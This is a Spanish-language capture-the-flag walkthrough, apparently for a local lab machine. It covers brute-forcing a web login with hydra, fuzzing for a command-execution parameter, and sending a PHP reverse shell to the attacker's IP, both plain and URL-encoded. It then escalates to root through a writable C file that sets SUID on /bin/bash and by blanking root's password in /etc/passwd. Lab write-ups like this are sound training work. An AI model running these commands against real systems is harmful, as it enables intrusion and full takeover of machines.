# Enumeracion de Puertos, Servicios y Versiones

```ruby
nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2 -oN nmap
```

![image](https://github.com/user-attachments/assets/a82e92d6-9b54-491b-9e1b-222710dad996)


al chequeaar el servicio web me consigo con la web del pinguino de mario

![image](https://github.com/user-attachments/assets/03a84f47-a274-4e18-90c0-a4bead79c80c)

revisando la web, me consigo un panel de login al intentar ir al `linkedin` del 🐧


![image](https://github.com/user-attachments/assets/3aed9c08-bdd6-44a8-8cdc-1aedf6d84347)


![image](https://github.com/user-attachments/assets/da669741-af31-41f1-949d-dcf7327511ff)


aqui despues de un rato logre conseguir las credenciales tras varios ataques al login

```ruby
 hydra -l administrator -P /usr/share/wordlists/rockyou.txt 172.17.0.2 http-post-form '/sobre-mi/login.php:username=^USER^&password=^PASS^:F=Usuario o contraseña incorrectos.' -f -t 64 -I
```
```bash
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-17 08:35:16
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344403 login tries (l:1/p:14344403), ~224132 tries per task
[DATA] attacking http-post-form://172.17.0.2:80/sobre-mi/login.php:username=^USER^&password=^PASS^:F=Usuario o contraseña incorrectos.
[80][http-post-form] host: 172.17.0.2   login: administrator   password: panther
[STATUS] attack finished for 172.17.0.2 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-17 08:35:26
```

y tras acceder me consigo un mensaje y credenciales por `ssh`

![image](https://github.com/user-attachments/assets/fa106f33-8dde-46ed-9841-d32fda4162cb)

intento acceder via `ssh` pero no puedo establecer la conexion 


![image](https://github.com/user-attachments/assets/d3342d28-21ab-438d-85e5-744059568ab6)


y si recuerdo la nota, existe un segmento de red que no esta restringido asi que cambio de ip hasta dar con el segmento que no lo esta y logro acceder con la 
ip `172.17.0.160`

![image](https://github.com/user-attachments/assets/111a0ce5-34fc-4a38-8fc8-666afbd3c0fe)

![image](https://github.com/user-attachments/assets/fed8e19b-5ffd-4bf7-ad39-cf73f1c17a17)

el user `darks` esta restringido con una `rbash` asi que no podria hacer mucho por aqui... asi que continuo chequeando la web ya que el mensaje que dejaron indica que
existe un fallo de seguridad... despues de chquear la web di con un `RCE` en `http://172.17.0.2/sobre-mi/confidencial.php`


```ruby
wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u "http://172.17.0.2/sobre-mi/confidencial.php?FUZZ=FUZZ" -t 200 -H 'Cookie: PHPSESSID=2sdb4tuojhi1bqhlshc2fscv31; session_id=427b45efbb0032a97935f3bfc53f0398'  --hh=1448
```

![image](https://github.com/user-attachments/assets/bd8ac310-6d2c-4a9e-8d62-944540d44f5c)

lo pruebo y en efecto tengo un `RCE`

![image](https://github.com/user-attachments/assets/f848fb7f-a5a4-45f8-bbcf-3cce6ef00ae6)

asi que me envio una revershell `php` porque una `bash` no funciona, `php -r '$sock=fsockopen("172.17.0.160",4444);shell_exec("/bin/bash <&3 >&3 2>&3");'` y url-encodeada queda
```
%70%68%70%20%2d%72%20%27%24%73%6f%63%6b%3d%66%73%6f%63%6b%6f%70%65%6e%28%22%31%37%32%2e%31%37%2e%30%2e%31%36%30%22%2c%34%34%34%34%29%3b%73%68%65%6c%6c%5f%65%78%65%63%28%22%2f%62%69%6e%2f%62%61%73%68%20%3c%26%33%20%3e%26%33%20%32%3e%26%33%22%29%3b%27
```


# Escalada

### www-data

tratamiento de la terminal

```
export TERM=xterm
export SHELL=bash
script /dev/null -c bash 
^Z
stty raw -echo; fg
reset xterm
stty rows 38 columns 168
```

despues de buscar un rato en el sistema, me consigo con un binario

```
find / -user www-data -type f -executable 2>/dev/null
```

![image](https://github.com/user-attachments/assets/a05d1c1b-8e8b-471e-9ad3-8732e39e8c11)

lo ejecuto pero no pasa nada, asi que lo paso a mi maquina para examinarlo

![image](https://github.com/user-attachments/assets/3937d4b4-9f8b-469f-839c-b1ab124fae9b)

aqui puedo observar una direccion ip `172.17.0.188`, un mensaje de error `Error al enviar datos` y una cadena que parece estar codificada en `base32/64` pero despues de
intentar decodificar, no es legible, asi que con el mensaje de error y la ip me da una pista, por lo que ejecuto nuevamente el binario desde el servidor y observo el trafico
de la red

![image](https://github.com/user-attachments/assets/7659f3f6-8fd6-4e6a-b444-988b4dfb42a4)


aqui ya puedo ver que se esta hhaciendo una solicitud arp preguntando por la misma ip del binario `172.17.0.188` asi que cambio mi ip por la ip del binario

![image](https://github.com/user-attachments/assets/2df1bdbe-025d-43e7-b608-fc4c2bf388f6)

despues de cambiar de ip se cae la revershell asi que la vuelvo establecer como antes, pero enviado la revershell a la nueva ip `172.17.0.188`, vuelvo ejecutar el binario
y observo el trafico de la red

![image](https://github.com/user-attachments/assets/92a3da64-0899-4694-b074-b1b6dbbf528f)

esta vez puedo ver mas informacion, como el puerto `7777` y la conexion `UDP` asi que me coloco en escucha por dicho puerto a ver si recibo algo


![image](https://github.com/user-attachments/assets/743295f5-a242-4112-928f-3d03d3910a27)


y en efecto, recibbo la cadena

```
MFDTS42ZKNCWOYZSHF2GEM2NM5NFO53HLIZUUMLDI44GOULNPBUFSMTUIRMVQULTJFEEE3DCNZHGQYSXHF5ESR2WOVEUOVTVLEZUU4DDJBJGQY3JIJWGGM2SNQFESSCONRRW4WTMMNUUE522LBFHMSKHGV3ESSCSOBNFONLMJFDTK2C2I5CWOWSHKVTWCVZVGBNFQSTMMN4XOZ3EI5KWOWKXNB3GG3SKNBRW2VLHMRDWY3DCLBBHMCSPNFBGUY3NNR5GIR2GONHW2UTZMIZUE2TBI44XUZCHHF3U4RCVPJKTA4CHJFCG6Z22I5WHUWTOJIYWIR2FJMFA====
```

que despues de decodificar, obtengo un mensaje con credenciales

![image](https://github.com/user-attachments/assets/4632d76d-e0cc-4cbf-884a-9f35048a488e)


### Cristal

en el directorio del user `cristal` puedo observar un script, un programa escrito en `C` y un binario

![image](https://github.com/user-attachments/assets/9de74a7f-b466-4403-9eeb-a13e2a9d4b36)


systm.sh
```
#!/bin/bash

var1="/home/cristal/systm.c"
var2="/home/cristal/syst"

while true; do
      gcc -o $var2 $var1
      $var2
      sleep 15
done
```
aqui ya puedo ver un error en el script, y es que dentro del bucle compila el binario y luego lo ejecuta, cuando solo debaria ejecutar el binario dentro del bucle
y si observamos los permisos de los archivos, vemos que el grupo `editor` tiene permiso de escritura sobre el programa `.C` que se compila en el script y que el user
`cristal` pertenece al grupo `editor` por lo que puedo editar el programa y hacer que ejecute lo que yo quiera, asi que hare que le asigne el bit suid al binario `/bin/bash` 
usando el siguiente codigo:

systm.c
```
#include <stdlib.h>

int main() {
    // Comando a ejecutar
    const char *command = "chmod u+s /bin/bash";

    // Ejecutar el comando usando system()
    (void)system(command); // Ignorar el resultado

    return 0;
}
```

![image](https://github.com/user-attachments/assets/25293dc5-cdb2-4477-be40-9942e97e1629)

asi que escalo a `root`

![image](https://github.com/user-attachments/assets/4dafcf50-ff6f-410e-95f9-4db9b1655344)

despues de escalar si observo el `id` no soy `root` completamente asi que edito el archivo `/etc/passwd` para eliminar la `x` en la linea de `root` y asi quede : `root::0:0:root:/root:/bin/bash`

![image](https://github.com/user-attachments/assets/ac41baed-01d1-4184-955f-9908e560f677)

ahora si soy `rot` totalmente






